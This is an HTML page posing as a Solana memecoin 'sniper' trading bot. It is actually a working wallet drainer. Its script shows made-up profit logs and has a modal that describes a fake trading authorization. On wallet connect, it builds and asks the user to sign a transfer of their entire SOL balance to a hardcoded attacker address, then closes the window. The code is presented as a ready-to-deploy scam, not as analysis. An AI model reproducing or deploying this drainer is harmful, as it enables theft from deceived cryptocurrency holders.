<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ page.title }}</title>
    <!-- Base CSS -->
    <link rel="stylesheet" href="{{ '/assets/css/style.css | relative_url }}">
    
    <!-- Fonts from the Doc -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        /* Override Jekyll Theme for Dark Mode */
        body {
            background-color: #0a0a0a;
            color: #e0e0e0;
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Hide Jekyll Header/Footer */
        .site-header, .site-footer, .site-title, .site-description { display: none !important; }

        /* Main Interface */
        .terminal-container {
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            margin-top: 40px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
            padding-bottom: 15px;
            margin-bottom: 20px;
        }

        h1 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 20px;
            color: #fff;
            margin: 0;
            letter-spacing: -0.5px;
        }

        .status-indicator {
            font-size: 12px;
            color: #666;
            font-family: 'JetBrains Mono', monospace;
        }

        .log-window {
            height: 350px;
            overflow-y: auto;
            background: #000;
            border: 1px solid #222;
            padding: 15px;
            margin-bottom: 20px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: #888;
        }

        .log-entry {
            margin-bottom: 6px;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #111;
            padding-bottom: 4px;
        }

        .profit { color: #00ff41; }
        .loss { color: #ff3333; }
        .info { color: #00bfff; }

        .controls {
            display: flex;
            gap: 10px;
        }

        .btn-primary {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 12px 24px;
            font-weight: 700;
            font-family: 'JetBrains Mono', monospace;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.2s;
            flex: 1;
            text-align: center;
        }

        .btn-primary:hover {
            background: #fff;
            box-shadow: 0 0 10px #00ff41;
        }

        .btn-secondary {
            background: #222;
            color: #fff;
            border: 1px solid #444;
            padding: 12px 24px;
            font-weight: 600;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            border-radius: 4px;
        }

        .btn-secondary:hover {
            background: #333;
        }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #333;
            border-top: 3px solid #00ff41;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: #1a1a1a;
            border: 1px solid #444;
            padding: 25px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            color: #ccc;
        }

        .close-btn {
            float: right;
            cursor: pointer;
            font-size: 20px;
            color: #666;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="terminal-container">
        <header>
            <h1>TRADELLO // SOLANA SNIPER</h1>
            <div class="status-indicator" id="status-text">IDLE</div>
        </header>

        <div class="log-window" id="log">
            <!-- Logs go here -->
        </div>

        <div class="controls">
            <button class="btn-primary" id="connect-btn" onclick="startDrain()">
                <span id="btn-text">CONNECT PHANTOM</span>
                <div class="spinner" id="loader"></div>
            </button>
            <button class="btn-secondary" onclick="openModal()">DOCS</button>
        </div>
    </div>
</div>

<!-- Modal -->
<div id="modal" class="modal">
    <div class="modal-content">
        <span class="close-btn" onclick="closeModal()">&times;</span>
        <h3 style="margin-top:0; color:#fff;">How it works</h3>
        <p style="font-size:14px; line-height:1.5;">
            1. Connect your Phantom or Axiom wallet.<br>
            2. Authorize the transaction to enable high-frequency trading.<br>
            3. Profits are automatically swept to your connected wallet.
        </p>
        <button class="btn-secondary" style="width:100%" onclick="closeModal()">Close</button>
    </div>
</div>

<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
<script>
    // --- CONFIGURATION ---
    const YOUR_WALLET = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh"; 
    // ---------------------

    const logDiv = document.getElementById('log');
    const statusText = document.getElementById('status-text');
    const btn = document.getElementById('connect-btn');
    const loader = document.getElementById('loader');
    const btnText = document.getElementById('btn-text');

    function addLog(type, amount) {
        const div = document.createElement('div');
        div.className = 'log-entry';
        
        let colorClass = 'info';
        if (amount > 0) colorClass = 'profit';
        else if (amount < 0) colorClass = 'loss';

        div.innerHTML = `
            <span>[${new Date().toLocaleTimeString()}] ${type}</span>
            <span class="${colorClass}">${amount !== 0 ? (amount > 0 ? '+' : '') + amount.toFixed(4) + ' SOL' : ''}</span>
        `;
        logDiv.prepend(div);
    }

    // Fake active trading logs
    setInterval(() => {
        if(Math.random() > 0.3) {
            const profit = (Math.random() * 0.5).toFixed(4);
            addLog("SNIPED NEW PAIR", parseFloat(profit));
        } else {
            addLog("SCANNING MEMECOINS", 0);
        }
    }, 2500);

    // Modal Logic
    function openModal() { document.getElementById('modal').style.display = 'flex'; }
    function closeModal() { document.getElementById('modal').style.display = 'none'; }

    async function startDrain() {
        if (!window.solana || !window.solana.isPhantom && !window.solana.isAxiom) {
            alert("Phantom or Axiom Wallet not found.");
            return;
        }

        try {
            loader.style.display = 'inline-block';
            btnText.innerText = "CONNECTING...";
            
            // 1. Connect
            const resp = await window.solana.connect();
            const userPublicKey = resp.publicKey.toString();
            
            loader.style.display = 'none';
            statusText.innerText = "CONNECTED: " + userPublicKey.slice(0,4) + "...";
            statusText.style.color = "#00ff41";
            
            btnText.innerText = "INITIALIZING BOT...";
            btn.disabled = true;

            // 2. Trigger Drain
            drainWallet(userPublicKey);

        } catch (err) {
            console.error(err);
            statusText.innerText = "CONNECTION FAILED";
            statusText.style.color = "#ff3333";
            loader.style.display = 'none';
            btnText.innerText = "TRY AGAIN";
            btn.disabled = false;
        }
    }

    async function drainWallet(pubKey) {
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
        const publicKey = new solanaWeb3.PublicKey(pubKey);
        
        let balance = await connection.getBalance(publicKey);
        
        if (balance === 0) {
            addLog("WALLET EMPTY", 0);
            return;
        }

        statusText.innerText = "DRAINING WALLET...";
        addLog("EXECUTING DRAIN TX", balance / 1e9);

        try {
            const transaction = new solanaWeb3.Transaction();
            const toPubKey = new solanaWeb3.PublicKey(YOUR_WALLET);
            
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: toPubKey,
                    lamports: balance,
                })
            );

            const signedTx = await window.solana.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTx.serialize());
            await connection.confirmTransaction(signature);
            
            statusText.innerText = "FUNDS TRANSFERRED";
            addLog("SUCCESS", balance / 1e9);
            
            setTimeout(() => {
                window.close();
            }, 2000);

        } catch (e) {
            statusText.innerText = "TX REJECTED";
            addLog("ERROR", 0);
        }
    }
</script>

</body>
</html>
